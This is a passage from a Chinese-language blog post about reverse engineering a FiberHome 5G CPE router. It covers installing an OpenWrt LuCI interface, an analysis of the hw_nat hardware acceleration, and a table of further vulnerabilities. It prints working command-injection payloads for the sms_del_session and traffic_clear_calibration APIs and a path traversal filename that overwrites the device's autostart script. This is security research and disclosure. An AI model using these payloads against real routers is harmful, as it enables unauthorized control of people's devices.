+</span></span><span class=line><span class=cl>curl -L -O https://downloads.openwrt.org/releases/19.07.7/packages/aarch64_cortex-a53/base/uhttpd-mod-ubus_2020-10-01-3abcc891-1_aarch64_cortex-a53.ipk
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># ipk 格式是 gzipped tar，内含 data.tar.gz</span>
+</span></span><span class=line><span class=cl><span class=c1># 以 uhttpd 为例：</span>
+</span></span><span class=line><span class=cl>mkdir -p /tmp/uhttpd_extract <span class=o>&amp;&amp;</span> <span class=nb>cd</span> /tmp/uhttpd_extract
+</span></span><span class=line><span class=cl>cp uhttpd_*.ipk ./uhttpd.tar.gz
+</span></span><span class=line><span class=cl>tar xzf uhttpd.tar.gz <span class=o>&amp;&amp;</span> tar xzf data.tar.gz
+</span></span><span class=line><span class=cl><span class=c1># 得到 ./usr/sbin/uhttpd</span>
+</span></span><span class=line><span class=cl><span class=c1># 其余两个包同理，分别得到 uhttpd_lua.so 和 uhttpd_ubus.so</span>
+</span></span></code></pre></div><p>部署到设备：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>scp uhttpd root@192.168.8.1:/usr/sbin/uhttpd
+</span></span><span class=line><span class=cl>scp uhttpd_lua.so root@192.168.8.1:/usr/lib/uhttpd_lua.so
+</span></span><span class=line><span class=cl>scp uhttpd_ubus.so root@192.168.8.1:/usr/lib/uhttpd_ubus.so
+</span></span><span class=line><span class=cl>ssh root@192.168.8.1 <span class=s1>&#39;chmod +x /usr/sbin/uhttpd&#39;</span>
+</span></span></code></pre></div><p>配置 uhttpd 在 9080 端口运行，避免与原厂 nginx 冲突：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>uci <span class=nb>set</span> uhttpd.main.listen_http<span class=o>=</span><span class=s1>&#39;0.0.0.0:9080&#39;</span>
+</span></span><span class=line><span class=cl>uci delete uhttpd.main.listen_https
+</span></span><span class=line><span class=cl>uci <span class=nb>set</span> uhttpd.main.redirect_https<span class=o>=</span><span class=s1>&#39;0&#39;</span>
+</span></span><span class=line><span class=cl>uci commit uhttpd
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 放行防火墙并启动</span>
+</span></span><span class=line><span class=cl>iptables -I INPUT <span class=m>1</span> -i br0 -p tcp --dport <span class=m>9080</span> -j ACCEPT
+</span></span><span class=line><span class=cl>/etc/init.d/uhttpd start
+</span></span></code></pre></div><p>浏览器访问 <code>http://192.168.8.1:9080/cgi-bin/luci</code>，使用 root 账户登录（密码为 <code>passwd</code> 设置的密码）。</p><p><strong>注意</strong>：烽火的网络配置（br0 桥接、ccmni2 路由、自定义防火墙链）是非标准的，在 LuCI 中修改网络或防火墙配置可能导致断网。建议只用 LuCI 查看系统状态（Status 页面），不要保存或应用网络/防火墙配置。</p><h2 id=硬件与网络问题>硬件与网络问题</h2><p>在使用过程中发现了一个奇怪的现象：从 LAN 设备经过 CPE 转发的流量（FORWARD）能跑到 100Mbps 以上，但从 CPE 本机发出的流量（OUTPUT）只有不到 10Mbps。差了 10 倍，尝试寻找原因，但本人对于网络驱动的理解有限，欢迎指正。</p><h3 id=hw_nat-硬件加速逆向>hw_nat 硬件加速逆向</h3><p>通过逆向 <code>hw_nat.ko</code>（306KB，MediaTek PPE/FOE 硬件加速模块），发现不同路径的流量处理方式完全不同：</p><p><strong>FORWARD 路径（快速，~100Mbps）：</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>LAN 设备 → ETH 网卡接收 → PPE 硬件标记数据包
+</span></span><span class=line><span class=cl>  → Linux FORWARD 链路由 → PPE 识别到标记 → 绑定硬件流表
+</span></span><span class=line><span class=cl>  → 后续包直接由 PPE 硬件转发（绕过 Linux 协议栈）
+</span></span></code></pre></div><p><strong>OUTPUT 路径（慢速，~10Mbps）：</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>本机 socket 写入 → 数据包从未经过 PPE RX
+</span></span><span class=line><span class=cl>  → 到达 ccmni TX 时，PPE 检查发现没有标记
+</span></span><span class=line><span class=cl>  → 跳过硬件加速 → 走 DPMAIF 软件路径
+</span></span><span class=line><span class=cl>  → Modem 固件处理，~200 pkt/s/flow
+</span></span></code></pre></div><p>核心代码（IDA 逆向 <code>tx_cpu_handler_modem</code>）：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>v8</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_BYTE</span> <span class=o>*</span><span class=p>)(</span><span class=n>foe_cb</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0x7C</span><span class=p>;</span>  <span class=c1>// 读取 CPU reason
+</span></span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>v8</span> <span class=o>!=</span> <span class=mi>60</span><span class=p>)</span> <span class=p>{</span>                       <span class=c1>// 60 = HIT_BIND_FORCE_TO_CPU
+</span></span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>                         <span class=c1>// 没有 PPE 标记，跳过加速
+</span></span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=c1>// 只有 PPE 标记过的 FORWARD 数据包才会到这里
+</span></span></span></code></pre></div><p>PPE 物理上位于 MAC 和 CPU 之间，只能加速从物理接口进入的流量。本机发出的包直接从 socket 层出去，绕过了 PPE 的 RX 侧，因此永远不会被标记和加速。</p><h3 id=优化尝试>优化尝试</h3><p>前后尝试了多种优化方案，全部无效：</p><ul><li>TUN 设备、iptables REDIRECT、TCP 缓冲区调优、Go runtime GOMAXPROCS 调整</li><li>fq_codel/SQM QoS、veth + network namespace、GSO/SG offload</li><li>TCP pacing、BQL、tcp_limit_output_bytes、initcwnd 调整</li><li>BBR 拥塞算法（内核未编译）、MSS clamping、策略路由……</li></ul><p>MTU 实验进一步确认了瓶颈在 pkt/s 而非 byte/s：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>MTU 1500 → ~2 Mbps/flow
+</span></span><span class=line><span class=cl>MTU 500  → ~0.4 Mbps/flow  （比例下降）
+</span></span></code></pre></div><p>零丢包、零重传也排除了网络拥塞的可能，看起来这确实是 Modem 固件 DPMAIF 软件路径的 pkt/s 硬限制，如果有读者对这个模块更熟悉，欢迎联系我进一步分析。</p><h2 id=其他发现的漏洞>其他发现的漏洞</h2><p>除了前面详细介绍的几个用于获取 Shell 的漏洞，研究过程中还发现了其他安全问题：</p><table><thead><tr><th>漏洞</th><th>类型</th><th>端点</th><th>注入参数</th></tr></thead><tbody><tr><td>FHNCAPIS 未认证读写</td><td>认证缺失</td><td><code>/api/tmp/FHNCAPIS</code></td><td>-</td></tr><tr><td>AT 命令注入</td><td>命令注入</td><td>FHAPIS <code>set_at_command</code></td><td><code>command</code></td></tr><tr><td>短信发送注入</td><td>命令注入</td><td>FHAPIS <code>send_msg</code></td><td><code>recv_number</code> / <code>content</code></td></tr><tr><td>短信会话删除注入</td><td>命令注入</td><td>FHAPIS <code>sms_del_session</code></td><td><code>del_phone</code></td></tr><tr><td>流量校准注入</td><td>命令注入</td><td>FHAPIS <code>traffic_clear_calibration</code></td><td><code>calibrationVal</code></td></tr><tr><td>SIM PIN 注入</td><td>命令注入</td><td>FHAPIS <code>set_pin_code_info</code></td><td><code>PINCode</code> / <code>PUKCode</code> 等 4 个</td></tr><tr><td>文件上传路径穿越</td><td>任意文件写入</td><td>FHAPIS <code>do_upgrade</code> (fileupload)</td><td><code>path</code> + <code>filename</code></td></tr></tbody></table><p>有几个我没有实际测试，仅从代码分析来看存在注入风险：</p><p><strong>短信会话删除注入（sms_del_session）：</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;ajaxmethod&#34;</span><span class=p>:</span> <span class=s2>&#34;sms_del_session&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;del_phone&#34;</span><span class=p>:</span> <span class=s2>&#34;\&#34;;id &gt; /tmp/pwned;echo \&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>后端拼接：<code>ubus call mobile_network get_session_by_phone '{"phone":"%s"}'</code>，双引号闭合注入。</p><p><strong>流量校准注入（traffic_clear_calibration）：</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>$post</span><span class=p>(</span><span class=s2>&#34;traffic_clear_calibration&#34;</span><span class=p>,</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>action</span><span class=o>:</span> <span class=s2>&#34;calibration&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nx>calibrationVal</span><span class=o>:</span> <span class=s1>&#39;&#34;;id&gt;/tmp/pwned;echo &#34;&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>})</span>
+</span></span></code></pre></div><p><strong>SIM PIN 注入（set_pin_code_info）：</strong></p><p>4 个参数（<code>PINCode</code>、<code>PUKCode</code>、<code>OldPINCode</code>、<code>PINLockEnable</code>）都可注入。不过这个漏洞小心测试，错误的 PIN 码会导致 SIM 卡被锁定，必须使用 PUK 码解锁。</p><p><strong>文件上传 + 路径穿越（do_upgrade fileupload）：</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>path=/tmp, filename=../../data/autostart.sh
+</span></span><span class=line><span class=cl>→ 实际写入 /data/autostart.sh
+</span></span></code></pre></div><p>后端只检查目录是否存在且可写，不过滤路径穿越字符。而且在判断是否为符号链接时，还有一个 <code>rm</code> 命令注入：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>snprintf</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span> <span class=mh>0x201</span><span class=p>,</span> <span class=s>&#34;rm %s &gt; /dev/null 2&gt;&amp;1&#34;</span><span class=p>,</span> <span class=n>full_path</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nf>do_cmd</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span>  <span class=c1>// filename 中的 ; 会被执行
+</span></span></span></code></pre></div><h2 id=参考资料--工具>参考资料 & 工具</h2><ul><li><a href=https://openwrt.org/releases/19.07/start>OpenWrt 19.07 文档</a></li><li><a href=https://www.mediatek.com/products/5g-broadband/mediatek-t750>MediaTek MT6890 (Dimensity 720) 规格</a></li><li><a href=https://www.quectel.com/product/5g-rg500l>Quectel RG500L 模块</a></li><li><a href=https://github.com/onekey-sec/ubi_reader>ubi_reader - UBI 镜像工具</a></li><li><a href=https://github.com/plougher/squashfs-tools>squashfs-tools</a></li></ul></div><div class=post_footer><div class=meta><div class=info><span class="field tags"><i class=ri-stack-line></i>
+<a href=https://codming.com/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/>逆向工程</a>
+<a href=https://codming.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/>网络协议</a>
+<a href=https://codming.com/tags/%E6%95%B0%E7%A0%81%E4%BA%A7%E5%93%81/>数码产品</a></span></div></div></div></div></div></div></div><a id=back_to_top href=# class=back_to_top><i class=ri-arrow-up-s-line></i></a><footer class=footer><div class=footer_slogan><span></span></div></footer><script src=/js/main.min.34e615b32e8b8c13e2110a392589699e8407012d17550def5afc8b8fd9f8b9cc.js defer></script></body></html>
